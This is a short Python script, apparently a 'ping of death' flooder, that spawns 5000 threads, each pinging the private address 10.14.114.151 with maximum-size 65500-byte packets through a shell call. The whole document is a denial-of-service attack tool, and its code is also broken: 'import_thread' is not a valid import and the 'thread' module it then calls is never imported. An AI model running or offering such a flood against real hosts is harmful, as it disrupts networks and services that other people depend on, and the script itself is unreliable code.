import subprocess
import_thread
import time
 
def POD(id):
	ret = subprocess.call("ping 10.14.114.151 -l 65500", shell=True)
	print ("%d," % id)
 
for i in range(5000):
	thread.start_new_thread(POD,(i,))
time.sleep(0.8)